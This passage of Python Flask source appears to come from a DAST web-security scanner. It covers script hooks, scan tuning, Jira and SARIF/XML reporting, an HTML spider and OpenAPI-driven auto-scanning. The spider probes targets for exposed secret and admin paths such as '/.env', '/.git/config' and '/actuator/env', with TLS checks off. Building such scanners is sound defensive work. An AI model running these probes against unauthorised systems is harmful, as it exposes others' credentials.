                    _hooks[event].append(fn)
                    count += 1
        except Exception as e:
            print(f"[HOOKS] Failed to load Python {path}: {e}")

    # ── JavaScript hooks (requires node) ──────────────────────────────────
    if _NODE_AVAILABLE:
        js_runner = os.path.join(tempfile.gettempdir(), "_dast_js_runner.js")
        with open(js_runner, "w") as f:
            f.write(_JS_RUNNER_SRC)
        node_bin = _shutil.which("node") or _shutil.which("nodejs")
        for path in _glob.glob(os.path.join(hooks_dir, "*.js")):
            try:
                content = open(path).read()
                # Detect function names defined in the file
                js_fns  = set(_re.findall(r'function\s+(\w+)\s*\(', content))
                js_fns |= set(_re.findall(
                    r'(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:\(|function)', content))
                for event in _HOOK_EVENTS:
                    if event not in js_fns:
                        continue
                    def _make_js(p=path, e=event, nb=node_bin, jr=js_runner):
                        def _call(payload=None):
                            try:
                                _sp.run(
                                    [nb, jr, p, e, _json.dumps(payload or {})],
                                    capture_output=True, text=True, timeout=5,
                                )
                            except Exception:
                                pass
                        return _call
                    _hooks[event].append(_make_js())
                    count += 1
                    print(f"[HOOKS] JS hook loaded: {os.path.basename(path)}::{event}")
            except Exception as e:
                print(f"[HOOKS] Failed to load JS {path}: {e}")
    else:
        print("[HOOKS] JavaScript hooks disabled — 'node' not found in PATH")

    # ── Groovy hooks (requires groovy on PATH) ────────────────────────────
    if _GROOVY_AVAILABLE:
        gv_runner = os.path.join(tempfile.gettempdir(), "_dast_groovy_runner.groovy")
        with open(gv_runner, "w") as f:
            f.write(_GROOVY_RUNNER_SRC)
        for path in _glob.glob(os.path.join(hooks_dir, "*.groovy")):
            try:
                content = open(path).read()
                # Detect closure/def names in Groovy file
                gv_fns  = set(_re.findall(r'def\s+(\w+)\s*[=\{(]', content))
                gv_fns |= set(_re.findall(r'(\w+)\s*=\s*\{', content))
                for event in _HOOK_EVENTS:
                    if event not in gv_fns:
                        continue
                    def _make_gv(p=path, e=event, gr=gv_runner):
                        def _call(payload=None):
                            try:
                                _sp.run(
                                    ["groovy", gr, p, e, _json.dumps(payload or {})],
                                    capture_output=True, text=True, timeout=10,
                                )
                            except Exception:
                                pass
                        return _call
                    _hooks[event].append(_make_gv())
                    count += 1
                    print(f"[HOOKS] Groovy hook loaded: {os.path.basename(path)}::{event}")
            except Exception as e:
                print(f"[HOOKS] Failed to load Groovy {path}: {e}")
    else:
        print("[HOOKS] Groovy hooks disabled — 'groovy' not found in PATH")

    return count


def _trigger_hook(event: str, *args, **kwargs) -> None:
    for fn in _hooks.get(event, []):
        try:
            fn(*args, **kwargs)
        except Exception:
            pass


@app.route("/api/hooks/reload", methods=["POST"])
@_login_required
def hooks_reload():
    _hooks.clear()
    count = _load_hooks()
    return jsonify({"success": True, "hooks_loaded": count,
                    "events": {k: len(v) for k, v in _hooks.items()}})


@app.route("/api/hooks/status")
@_login_required
def hooks_status():
    return jsonify({
        "events":   {k: len(v) for k, v in _hooks.items()},
        "total":    sum(len(v) for v in _hooks.values()),
        "runtimes": {
            "python":     True,
            "javascript": _NODE_AVAILABLE,
            "groovy":     _GROOVY_AVAILABLE,
        },
    })


# ── Auto-load hooks at startup ────────────────────────────────────────────────
_load_hooks()


# ═══════════════════════════════════════════════════════════════════════════════
# ██  PER-AGENT TUNING  (ZAP scan policy parity)
# ═══════════════════════════════════════════════════════════════════════════════

_INTENSITY_ITER = {"low": 5, "medium": 10, "high": 20}

_agent_config: dict = {
    spec["name"]: {"enabled": True, "intensity": "medium"}
    for spec in _DAST_AGENTS
}


@app.route("/api/config/agents", methods=["POST"])
@_login_required
def set_agent_config():
    data = req.json or {}
    for agent_name, cfg in data.items():
        if agent_name in _agent_config:
            if "enabled" in cfg:
                _agent_config[agent_name]["enabled"] = bool(cfg["enabled"])
            if "intensity" in cfg and cfg["intensity"] in _INTENSITY_ITER:
                _agent_config[agent_name]["intensity"] = cfg["intensity"]
    return jsonify({"success": True, "config": _agent_config})


@app.route("/api/config/agents")
@_login_required
def get_agent_config():
    return jsonify({"config": _agent_config, "intensity_levels": list(_INTENSITY_ITER.keys())})


# ── Wire tuning into scan launch ──────────────────────────────────────────────
# (Patch scan_launch to respect _agent_config — intensity → max_iter, enabled → skip)
_original_scan_launch = app.view_functions["scan_launch"]


def _patched_scan_launch():
    response = _original_scan_launch()
    # Already launched; post-patch each agent's max_iter and remove disabled agents
    with _lock:
        for aid, state in list(_agents.items()):
            cfg = _agent_config.get(state["name"], {})
            if not cfg.get("enabled", True):
                state["stop"]   = True
                state["status"] = "stopped"
            else:
                intensity = cfg.get("intensity", "medium")
                state["max_iter"] = _INTENSITY_ITER.get(intensity, 10)
    return response


app.view_functions["scan_launch"] = _patched_scan_launch

# ── Gap 5: Jira / webhook integration on scan complete ───────────────────────

_MIN_SEVERITY_FOR_TICKET = os.environ.get("JIRA_MIN_SEVERITY", "high").lower()
_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

def _fire_integrations_on_complete(scan_id: str, findings: list, target: str) -> None:
    """Send findings to Jira / generic webhook if configured. Non-blocking, best-effort."""
    jira_url    = os.environ.get("JIRA_URL", "")
    jira_user   = os.environ.get("JIRA_USER", "")
    jira_token  = os.environ.get("JIRA_TOKEN", "")
    webhook_url = os.environ.get("WEBHOOK_URL", "")
    project_key = os.environ.get("JIRA_PROJECT", "SEC")
    min_sev_rank = _SEV_ORDER.get(_MIN_SEVERITY_FOR_TICKET, 1)

    if not jira_url and not webhook_url:
        return

    def _send():
        try:
            from modules.reporting import JiraWebhook
            filtered = [f for f in findings
                        if _SEV_ORDER.get((f.get("severity") or "info").lower(), 99) <= min_sev_rank]
            if not filtered:
                log.info("[Integration] No findings at or above %s — skipping", _MIN_SEVERITY_FOR_TICKET)
                return
            jw = JiraWebhook(
                webhook_url=webhook_url or None,
                jira_url=jira_url or None,
                jira_user=jira_user or None,
                jira_token=jira_token or None,
                project_key=project_key,
            )
            results = jw.create_tickets(filtered, target=target, max_tickets=50)
            log.info("[Integration] Sent %d tickets/webhooks for scan %s", len(results), scan_id)
            _db.log_audit("integration_fired", scan_id=scan_id,
                          detail=f"tickets={len(results)} min_sev={_MIN_SEVERITY_FOR_TICKET}")
        except Exception as e:
            log.warning("[Integration] Jira/webhook error: %s", e)

    threading.Thread(target=_send, daemon=True, name="dast-integration").start()


# ── Also inject hook trigger into scan lifecycle ──────────────────────────────
_orig_scan_stop = app.view_functions["scan_stop"]


def _patched_scan_stop():
    _trigger_hook("after_scan", list(_findings))
    # Persist scan completion
    if _active_scan_id:
        get_store().complete_scan(_active_scan_id)
        _db.log_audit("scan_stopped", scan_id=_active_scan_id,
                      actor=session.get("user", "anonymous"), ip=req.remote_addr,
                      detail=f"findings={len(_findings)}")
        get_global_bus().publish(SCAN_STOPPED, {
            "scan_id": _active_scan_id,
            "finding_count": len(_findings),
            "target": _scan_target,
        })
        # ── Gap 5: Fire Jira/webhook integration on scan complete ─────────────
        _fire_integrations_on_complete(_active_scan_id, list(_findings), _scan_target)
    return _orig_scan_stop()


app.view_functions["scan_stop"] = _patched_scan_stop


# ═══════════════════════════════════════════════════════════════════════════════
# ██  SARIF 2.1.0 REPORT  (CI/CD gate format — GitHub, GitLab, Azure DevOps)
# ═══════════════════════════════════════════════════════════════════════════════

_SEV_SARIF = {
    "critical": "error", "high": "error",
    "medium":   "warning", "low": "note", "info": "note",
}
_SEV_RANK = {"critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 1.0}


def _render_sarif(findings: list, target: str) -> dict:
    rules = {}
    results = []
    for f in findings:
        rule_id = re.sub(r"\W+", "_", f.get("agent", "unknown"))[:40]
        sev     = f.get("severity", "medium")
        if rule_id not in rules:
            rules[rule_id] = {
                "id": rule_id,
                "name": f.get("agent", "Unknown"),
                "shortDescription": {"text": f.get("agent", "DAST Finding")},
                "fullDescription": {"text": f.get("agent", "DAST Finding")},
                "defaultConfiguration": {"level": _SEV_SARIF.get(sev, "warning")},
                "properties": {
                    "tags": [f.get("phase", "")],
                    "security-severity": str(_SEV_RANK.get(sev, 5.0)),
                },
            }
        results.append({
            "ruleId": rule_id,
            "level": _SEV_SARIF.get(sev, "warning"),
            "message": {"text": f.get("finding", "")},
            "locations": [{"physicalLocation": {
                "artifactLocation": {"uri": f.get("target", target)},
            }}],
            "properties": {"severity": sev, "agent": f.get("agent", ""), "icon": f.get("icon", ""), "suggested_fix": f.get("suggested_fix", ""), "signal_count": f.get("signal_count", 1), "epss_score": f.get("epss_score")},
        })

    return {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "DAST AI Agent",
                    "version": "1.0.0",
                    "informationUri": "https://github.com/your-org/dast-standalone",
                    "rules": list(rules.values()),
                }
            },
            "results": results,
            "properties": {"target": target},
        }],
    }


@app.route("/api/report/sarif")
@_login_required
def findings_sarif():
    with _lock:
        data = list(_findings)
    sarif    = _render_sarif(data, _scan_target or "unknown")
    filename = f"dast_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sarif"
    return Response(
        json.dumps(sarif, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


# ═══════════════════════════════════════════════════════════════════════════════
# ██  XML REPORT  (ZAP traditional-xml parity)
# ═══════════════════════════════════════════════════════════════════════════════

def _render_xml(findings: list, target: str) -> str:
    ts    = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    lines = ['<?xml version="1.0" encoding="UTF-8"?>',
             f'<report generated="{ts}" target="{target}" count="{len(findings)}">',
             "  <findings>"]
    for f in findings:
        def _esc(s: str) -> str:
            return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                    .replace(">", "&gt;").replace('"', "&quot;"))
        lines.append(
            f'    <finding severity="{_esc(f.get("severity",""))}" '
            f'phase="{_esc(f.get("phase",""))}" '
            f'agent="{_esc(f.get("agent",""))}" '
            f'ts="{_esc(f.get("ts",""))}">'
        )
        lines.append(f'      <description>{_esc(f.get("finding",""))}</description>')
        lines.append(f'      <target>{_esc(f.get("target",""))}</target>')
        lines.append("    </finding>")
    lines += ["  </findings>", "</report>"]
    return "\n".join(lines)


@app.route("/api/report/xml")
@_login_required
def findings_xml():
    with _lock:
        data = list(_findings)
    xml_str  = _render_xml(data, _scan_target or "unknown")
    filename = f"dast_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
    return Response(
        xml_str,
        mimetype="application/xml",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


# ═══════════════════════════════════════════════════════════════════════════════
# ██  TRADITIONAL SPIDER  (ZAP-style HTML link crawler, no JS execution)
# ═══════════════════════════════════════════════════════════════════════════════

from html.parser import HTMLParser
from collections import deque as _deque
from urllib.parse import urljoin, urldefrag


class _TraditionalSpider:
    """Pure HTML link spider — ZAP traditional spider parity.

    Extracts links from <a href>, <form action>, <img src>, <script src>,
    <link href>, <iframe src>, <area href>, then recursively crawls in-scope URLs.
    No JavaScript execution — use Playwright AJAX spider for SPAs.
    """

    # Common seed paths — same as modules/crawler.py but condensed to the
    # highest-signal entries so the spider doesn't waste time on irrelevant paths.
    _SEED_PATHS = [
        "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
        "/.well-known/security.txt",
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/swagger.json", "/openapi.json", "/api-docs", "/swagger-ui.html",
        "/graphql", "/gql",
        "/admin", "/login", "/dashboard", "/console",
        "/actuator", "/actuator/health", "/actuator/env",
        "/health", "/status", "/metrics",
        "/.git/config", "/.env",
        "/wp-admin", "/phpmyadmin",
        "/api/health", "/api/me", "/api/users", "/api/user",
    ]

    def __init__(self, target: str, max_depth: int = 5, max_urls: int = 0,
                 scope: str = "domain", timeout: int = 10,
                 session=None):
        self.target    = target
        self.max_depth = max_depth
        self.max_urls  = max_urls   # 0 = unlimited
        self.scope     = scope      # "domain" | "path"
        self.timeout   = timeout
        self.session   = session    # optional auth session
        self._base     = urlparse(target)
        self._lock     = threading.Lock()
        self._stop_ev  = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.visited:  list = []
        self.found:    list = []
        self.status    = "idle"

    # ── Scope check ───────────────────────────────────────────────────────
    def _in_scope(self, url: str) -> bool:
        p = urlparse(url)
        if p.scheme not in ("http", "https"):
            return False
        if self.scope == "path":
            return (p.netloc == self._base.netloc and
                    p.path.startswith(self._base.path))
        return p.netloc == self._base.netloc  # default: same domain

    # ── Link extractor (pure stdlib html.parser) ──────────────────────────
    @staticmethod
    def _extract_links(html_body: str, base_url: str) -> list:
        links: list = []

        class _LP(HTMLParser):
            _ATTRS = {
                "a": "href", "area": "href", "link": "href",
                "form": "action",
                "img": "src", "script": "src", "iframe": "src", "frame": "src",
            }
            def handle_starttag(self, tag, attrs):
                attr_name = _LP._ATTRS.get(tag)
                if not attr_name:
                    return
                val = dict(attrs).get(attr_name)
                if val:
                    abs_url, _ = urldefrag(urljoin(base_url, val))
                    if abs_url.startswith(("http://", "https://")):
                        links.append(abs_url)

        try:
            _LP().feed(html_body)
        except Exception:
            pass
        return links

    # ── Fetch helper (uses auth session when available) ────────────────────
    def _fetch(self, url: str):
        import requests as _req_spider
        import urllib3 as _u3
        _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
        hdrs = {"User-Agent": "DAST-Spider/1.0", "Connection": "close"}
        if self.session:
            return self.session.get(
                url, timeout=self.timeout, verify=False,
                allow_redirects=True, headers=hdrs,
            )
        return _req_spider.get(
            url, timeout=self.timeout, verify=False,
            allow_redirects=True, headers=hdrs,
        )

    # ── Parse robots.txt and sitemap.xml for extra URLs ────────────────────
    def _seed_from_robots(self, base: str, q: _deque, seen: set):
        try:
            r = self._fetch(base.rstrip("/") + "/robots.txt")
            if r.status_code == 200 and "text/plain" in r.headers.get("Content-Type", ""):
                for line in r.text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("sitemap:"):
                        sm_url = line.split(":", 1)[1].strip()
                        if sm_url not in seen and self._in_scope(sm_url):
                            seen.add(sm_url)
                            q.appendleft((sm_url, 0))
                    elif line.lower().startswith("allow:") or line.lower().startswith("disallow:"):
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/" and not path.startswith("*"):
                            full = base.rstrip("/") + path
                            if full not in seen and self._in_scope(full):
                                seen.add(full)
                                q.append((full, 1))
        except Exception:
            pass

    def _seed_from_sitemap(self, url: str, q: _deque, seen: set, depth: int = 0):
        if depth > 2:
            return
        try:
            r = self._fetch(url)
            if r.status_code != 200:
                return
            body = r.text
            # Extract <loc> entries from sitemap XML
            for m in re.finditer(r"<loc>\s*(https?://[^<]+)\s*</loc>", body, re.I):
                loc = m.group(1).strip()
                if "sitemap" in loc.lower():
                    # Nested sitemap index — recurse
                    if loc not in seen:
                        seen.add(loc)
                        self._seed_from_sitemap(loc, q, seen, depth + 1)
                elif loc not in seen and self._in_scope(loc):
                    seen.add(loc)
                    q.append((loc, 1))
        except Exception:
            pass

    # ── Crawl loop (runs in background thread) ────────────────────────────
    def _crawl(self) -> None:
        self.status = "running"
        seen: set = set()
        base = f"{self._base.scheme}://{self._base.netloc}"

        # Seed queue: target + common discovery paths + robots.txt/sitemap
        q = _deque([(self.target, 0)])
        seen.add(self.target)

        # Add seeded paths at depth 1
        for path in self._SEED_PATHS:
            full = base + path
            if full not in seen:
                seen.add(full)
                q.append((full, 1))

        # Harvest sitemap.xml and robots.txt before BFS starts
        self._seed_from_robots(base, q, seen)
        sitemap_url = base + "/sitemap.xml"
        if sitemap_url not in seen:
            seen.add(sitemap_url)
            self._seed_from_sitemap(sitemap_url, q, seen)

        while q and not self._stop_ev.is_set():
            url, depth = q.popleft()
            if depth > self.max_depth:
                continue
            if self.max_urls and len(self.visited) >= self.max_urls:
                break

            try:
                _sr = self._fetch(url)
                status       = _sr.status_code
                content_type = _sr.headers.get("Content-Type", "")
                body         = _sr.text[:1_000_000] if "text/html" in content_type else ""
            except Exception as _crawl_exc:
                log.debug("[Spider] fetch failed for %s: %s", url, _crawl_exc)
                continue

            with self._lock:
                self.visited.append(url)
                self.found.append(url)
                _site_map[url] = {
                    "method":       "GET",
                    "status":       status,
                    "content_type": content_type,
                    "source":       "spider",
                }

            if body and depth < self.max_depth:
                for link in self._extract_links(body, url):
                    if link not in seen and self._in_scope(link):
                        seen.add(link)
                        q.append((link, depth + 1))

        self.status = "stopped" if self._stop_ev.is_set() else "done"

    def start(self) -> None:
        self._stop_ev.clear()
        self._thread = threading.Thread(target=self._crawl, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_ev.set()

    def is_running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())


_spider: Optional[_TraditionalSpider] = None


@app.route("/api/spider/start", methods=["POST"])
@_login_required
def spider_start():
    global _spider
    data   = req.get_json(silent=True) or {}
    target = data.get("target") or _scan_target
    if not target:
        return jsonify({"error": "No target — enter a URL or start a scan first"}), 400
    if _spider and _spider.is_running():
        return jsonify({"error": "Spider already running", "status": _spider.status}), 409

    # Auto-resolve scheme/port (http→https upgrade, alt-port detection)
    target = _resolve_target(target)

    _spider = _TraditionalSpider(
        target    = target,
        max_depth = int(data.get("max_depth", 5)),
        max_urls  = int(data.get("max_urls",  0)),
        scope     = data.get("scope", "domain"),
        timeout   = int(data.get("timeout", 10)),
        session   = _engine_auth_handler.session if _engine_auth_handler else None,
    )
    _spider.start()
    _log_activity("spider_start", target)
    _trigger_hook("before_scan", {"mode": "traditional_spider", "target": target})
    return jsonify({"started": True, "target": target,
                    "max_depth": _spider.max_depth, "scope": _spider.scope})


@app.route("/api/spider/stop", methods=["POST"])
@_login_required
def spider_stop():
    if _spider:
        _spider.stop()
        with _spider._lock:
            found = len(_spider.found)
        _log_activity("spider_stop", _spider.target, f"{found} URLs found")
        return jsonify({"stopped": True})
    return jsonify({"stopped": False, "error": "No spider running"})


@app.route("/api/spider/status")
@_login_required
def spider_status():
    if not _spider:
        return jsonify({"status": "idle", "urls_found": 0, "urls_visited": 0})
    with _spider._lock:
        found   = len(_spider.found)
        visited = len(_spider.visited)
    return jsonify({
        "status":       _spider.status,
        "running":      _spider.is_running(),
        "urls_found":   found,
        "urls_visited": visited,
        "max_depth":    _spider.max_depth,
        "scope":        _spider.scope,
    })


@app.route("/api/spider/results")
@_login_required
def spider_results():
    if not _spider:
        return jsonify({"urls": [], "count": 0})
    with _spider._lock:
        urls = list(_spider.found)
    return jsonify({"urls": urls, "count": len(urls)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  OPENAPI / SWAGGER IMPORT  (ZAP openapi add-on parity)
# ═══════════════════════════════════════════════════════════════════════════════
#
# Supports:
#   • OpenAPI 3.x  (application/json or application/yaml)
#   • Swagger 2.0  (swagger: "2.0")
#   • Import from URL  (fetched server-side)
#   • Import from uploaded JSON/YAML body
#
# On import:
#   1. All paths + methods extracted
#   2. Path params substituted with test values → concrete URLs built
#   3. Query params collected
#   4. Every endpoint added to _site_map (source="openapi")
#   5. _openapi_endpoints list available for agents as extra attack surface
# ──────────────────────────────────────────────────────────────────────────────

import yaml as _yaml
_YAML_AVAILABLE = True

# Holds parsed state from last import
_openapi_state: dict = {
    "title":      "",
    "version":    "",
    "spec_type":  "",          # "openapi3" | "swagger2"
    "base_url":   "",
    "endpoints":  [],          # list of {method, path, url, params, tags}
    "imported_at": None,
}
_openapi_endpoints: list = []   # mirrors _openapi_state["endpoints"] for fast access

# ── Test values substituted into path parameters ──────────────────────────────
_PARAM_TEST_VALUES: dict = {
    "id":       "1",
    "userId":   "1",
    "petId":    "1",
    "orderId":  "1",
    "name":     "test",
    "username": "admin",
    "token":    "test-token",
    "key":      "test-key",
    "slug":     "test-slug",
    "uuid":     "00000000-0000-0000-0000-000000000000",
    "default":  "1",
}


def _substitute_path_params(path: str, param_names: list) -> str:
    """Replace {param} placeholders with safe test values."""
    result = path
    for name in param_names:
        val = _PARAM_TEST_VALUES.get(name, _PARAM_TEST_VALUES["default"])
        result = result.replace(f"{{{name}}}", val)
    return result


def _parse_openapi_spec(spec: dict, source_url: str = "") -> dict:
    """Parse OpenAPI 3.x or Swagger 2.0 spec dict → normalised endpoint list."""
    endpoints: list = []

    # ── Determine spec type and base URL ──────────────────────────────────
    if "openapi" in spec:                          # OAS 3.x
        spec_type = "openapi3"
        info      = spec.get("info", {})
        servers   = spec.get("servers", [{}])
        server_url = servers[0].get("url", "") if servers else ""
        if server_url.startswith("/"):             # relative → prepend source host
            from urllib.parse import urlparse as _up
            p = _up(source_url)
            server_url = f"{p.scheme}://{p.netloc}{server_url}"
        base_url = server_url.rstrip("/")

    elif spec.get("swagger", "").startswith("2"): # Swagger 2.0
        spec_type = "swagger2"
        info      = spec.get("info", {})
        host      = spec.get("host", "")
        base_path = spec.get("basePath", "/").rstrip("/")
        schemes   = spec.get("schemes", ["https"])
        scheme    = schemes[0] if schemes else "https"
        base_url  = f"{scheme}://{host}{base_path}" if host else ""
        if not base_url and source_url:
            from urllib.parse import urlparse as _up
            p = _up(source_url)
            base_url = f"{p.scheme}://{p.netloc}{base_path}"
    else:
        return {"error": "Unrecognised spec — expected OpenAPI 3.x or Swagger 2.0"}

    # ── Extract paths ──────────────────────────────────────────────────────
    paths = spec.get("paths", {})
    http_methods = {"get", "post", "put", "patch", "delete", "head", "options"}

    for path, path_item in paths.items():
        if not isinstance(path_item, dict):
            continue

        # Collect path-level parameters
        path_params_all = path_item.get("parameters", [])

        for method, operation in path_item.items():
            if method.lower() not in http_methods:
                continue
            if not isinstance(operation, dict):
                continue

            # Merge path-level + operation-level params
            op_params  = operation.get("parameters", [])
            all_params = path_params_all + op_params

            path_param_names = [
                p.get("name", "") for p in all_params
                if p.get("in") == "path"
            ]
            query_params = [
                {"name": p.get("name"), "required": p.get("required", False)}
                for p in all_params if p.get("in") == "query"
            ]

            concrete_path = _substitute_path_params(path, path_param_names)
            full_url      = base_url + concrete_path

            # Build query string from required params
            req_query = "&".join(
                f"{p['name']}=test" for p in query_params if p["required"]
            )
            if req_query:
                full_url += "?" + req_query

            endpoints.append({
                "method":       method.upper(),
                "path":         path,
                "url":          full_url,
                "query_params": query_params,
                "tags":         operation.get("tags", []),
                "summary":      operation.get("summary", ""),
                "operationId":  operation.get("operationId", ""),
            })

    return {
        "spec_type":  spec_type,
        "title":      info.get("title", "Unknown"),
        "version":    info.get("version", ""),
        "base_url":   base_url,
        "endpoints":  endpoints,
    }


def _load_spec_from_url(url: str) -> dict:
    """Fetch spec from URL, auto-detect JSON/YAML."""
    import urllib.request as _ur
    try:
        with _ur.urlopen(_ur.Request(url, headers={"Accept": "application/json,*/*"}),
                         timeout=15) as r:
            raw = r.read().decode("utf-8", errors="replace")
    except Exception as e:
        return {"error": f"Fetch failed: {e}"}
    return _decode_spec(raw)


def _decode_spec(raw: str) -> dict:
    """Try JSON first, then YAML."""
    try:
        return {"spec": json.loads(raw)}
    except json.JSONDecodeError:
        pass
    if _YAML_AVAILABLE:
        try:
            return {"spec": _yaml.safe_load(raw)}
        except Exception as e:
            return {"error": f"YAML parse error: {e}"}
    return {"error": "Not valid JSON — install PyYAML for YAML support (pip install pyyaml)"}


@app.route("/api/openapi/import", methods=["POST"])
@_login_required
def openapi_import():
    """Import OpenAPI/Swagger spec from URL or raw body."""
    global _openapi_endpoints
    data = req.get_json(silent=True) or {}

    spec_url  = data.get("url", "").strip()
    raw_body  = data.get("spec", "")        # raw JSON/YAML string from UI paste
    source_url = spec_url

    # ── Resolve spec ──────────────────────────────────────────────────────
    if spec_url:
        result = _load_spec_from_url(spec_url)
    elif raw_body:
        result = _decode_spec(raw_body)
        source_url = _scan_target or ""
    else:
        return jsonify({"error": "Provide 'url' or 'spec' in request body"}), 400

    if "error" in result:
        return jsonify(result), 400

    # ── Parse ─────────────────────────────────────────────────────────────
    parsed = _parse_openapi_spec(result["spec"], source_url)
    if "error" in parsed:
        return jsonify(parsed), 400

    endpoints = parsed["endpoints"]

    # ── Populate site map ─────────────────────────────────────────────────
    with _lock:
        for ep in endpoints:
            _site_map[ep["url"]] = {
                "method":       ep["method"],
                "status":       0,
                "content_type": "",
                "source":       "openapi",
                "tags":         ep.get("tags", []),
                "summary":      ep.get("summary", ""),
            }

    # ── Persist state ─────────────────────────────────────────────────────
    _openapi_state.update({
        "title":       parsed["title"],
        "version":     parsed["version"],
        "spec_type":   parsed["spec_type"],
        "base_url":    parsed["base_url"],
        "endpoints":   endpoints,
        "imported_at": datetime.now(timezone.utc).isoformat(),
        "source_url":  spec_url,
    })
    _openapi_endpoints.clear()
    _openapi_endpoints.extend(endpoints)

    # ── Auto-scan (optional) ──────────────────────────────────────
    auto_scan      = data.get("auto_scan", False)
    scan_started   = False
    scan_skipped   = ""

    if auto_scan:
        with _engine_lock:
            already_running = _engine_running
        if already_running:
            scan_skipped = "engine scan already running"
        else:
            # Convert endpoints to InputSurface objects via modules/openapi.py
            spec_source = result["spec"]
            base_url_override = parsed["base_url"]
            scan_started = True
            _start_openapi_auto_scan(spec_source, base_url_override, source_url)

    return jsonify({
        "success":        True,
        "title":          parsed["title"],
        "version":        parsed["version"],
        "spec_type":      parsed["spec_type"],
        "base_url":       parsed["base_url"],
        "endpoints_found": len(endpoints),
        "urls_added_to_sitemap": len(endpoints),
        "scan_started":   scan_started,
        "scan_skipped":   scan_skipped or None,
    })


# ── OpenAPI Auto-Scan Worker ─────────────────────────────────────────────────

def _start_openapi_auto_scan(spec: dict, base_url: str, source_url: str):
    """Launch a background scan of all endpoints discovered from an OpenAPI spec."""
    global _engine_running, _engine_stop_event, _engine_thread
    global _engine_sitemap, _engine_fuzz_results, _engine_fingerprint
    global _engine_status_msg, _engine_progress

    _engine_stop_event   = threading.Event()
    _engine_sitemap      = None
    _engine_fuzz_results = []
    _engine_fingerprint  = {}
    _engine_status_msg   = "openapi auto-scan starting"
    _engine_progress     = {
        "phase":               "openapi_import",
        "pages_crawled":       0,
        "surfaces_found":      0,
        "payloads_sent":       0,
        "findings_count":      0,
        "source":              "openapi",
        "passive_count":       0,
        "browse_count":        0,
        "detected_url":        None,
        "external_tools":      [],
        "external_status":     "",
        "nuclei_folder":       "",
        "nuclei_folders_done": 0,
        "nuclei_folders_total": 0,
        "current_tool":        "",
        "tools_ran_last_scan": [],
        "race_findings":       0,
        "race_tested":         0,
        "race_total":          0,
        "race_current_url":    "",
        "coverage_checks":     ["COV-REGISTRY-001"],
    }
    _engine_running = True

    _engine_thread = threading.Thread(
        target=_openapi_auto_scan_worker,
        args=(spec, base_url, source_url),
        daemon=True,
        name="dast-openapi-autoscan",
    )
    _engine_thread.start()


def _openapi_auto_scan_worker(spec: dict, base_url: str, source_url: str):
    """Background thread: convert OpenAPI spec → InputSurfaces → passive + fuzz + OWASP."""
    global _engine_sitemap, _engine_fuzz_results, _engine_fingerprint
    global _engine_running, _engine_status_msg, _engine_progress
    global _passive_findings

    try:
        if not _ENGINE_AVAILABLE:
            _engine_status_msg = "error: engine modules not loaded"
            return

        # ── 0. Build surfaces from spec ──────────────────────────────────────
        _engine_status_msg = "parsing spec into attack surfaces"
        _engine_progress["phase"] = "parsing"

        surfaces = import_openapi(spec, base_url=base_url)
        if not surfaces:
            _engine_status_msg = "complete (no fuzzable surfaces found)"
            _engine_progress["phase"] = "complete"
            return

        # Build a SiteMap from the imported surfaces
        from modules.crawler import SiteMap
        sitemap = SiteMap()
        seen_urls = set()
        for s in surfaces:
            sitemap.add_surface(s)
            if s.url not in seen_urls:
                sitemap.add_page(s.url, 0, "", {}, title=f"OpenAPI: {s.method} {s.url}")
                seen_urls.add(s.url)

        with _engine_lock:
            _engine_sitemap = sitemap
            _engine_progress["surfaces_found"] = len(surfaces)

        if _engine_stop_event.is_set():
            _engine_status_msg = "stopped"
            return

        # ── 1. Setup session ─────────────────────────────────────────────────
        target = base_url or source_url
        scope  = ScopeManager(target)
        session = _engine_auth_handler.session if _engine_auth_handler else None

        import requests as _req_lib
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        if session is None:
            session = PassiveInterceptSession()
            session.verify = False
            session.headers["User-Agent"] = "Mozilla/5.0 (DAST-Engine/2.0 OpenAPI-AutoScan)"
            _retry = Retry(total=2, connect=2, read=2, backoff_factor=0.3,
                           status_forcelist=[500, 502, 503, 504],
                           allowed_methods=["HEAD", "GET", "OPTIONS"])
            _adapter = HTTPAdapter(max_retries=_retry)
            session.mount("http://", _adapter)
            session.mount("https://", _adapter)

        # ── 2. Passive scan each unique URL ──────────────────────────────────
        _engine_status_msg = "passive scanning OpenAPI endpoints"
        _engine_progress["phase"] = "passive"
        p_count = 0

        for page_url in seen_urls:
            if _engine_stop_event.is_set():
                break
            try:
                resp = session.get(page_url, timeout=10)
                pf   = _passive.scan(
                    url             = page_url,
                    status_code     = resp.status_code,
                    resp_headers    = dict(resp.headers),
                    resp_body       = resp.text[:8000],
                    cookies         = {c.name: c.value for c in session.cookies},
                    request_headers = dict(session.headers),
                )
                for f in pf:
                    d = f.to_dict()
                    with _engine_lock:
                        _passive_findings.append(d)
                        p_count += 1
                        _engine_progress["passive_count"] = p_count
            except Exception:
                pass

        if _engine_stop_event.is_set():
            _engine_status_msg = "stopped"
            return

        # ── 3. Fingerprint (first reachable URL) ────────────────────────────
        _engine_status_msg = "fingerprinting"
        _engine_progress["phase"] = "fingerprinting"

        for page_url in seen_urls:
            try:
                fp_resp = session.get(page_url, timeout=10)
                fp = fingerprint(
                    url          = page_url,
                    status_code  = fp_resp.status_code,
                    resp_headers = dict(fp_resp.headers),
                    resp_body    = fp_resp.text[:8000],
                    cookies      = {c.name: c.value for c in session.cookies},
                )
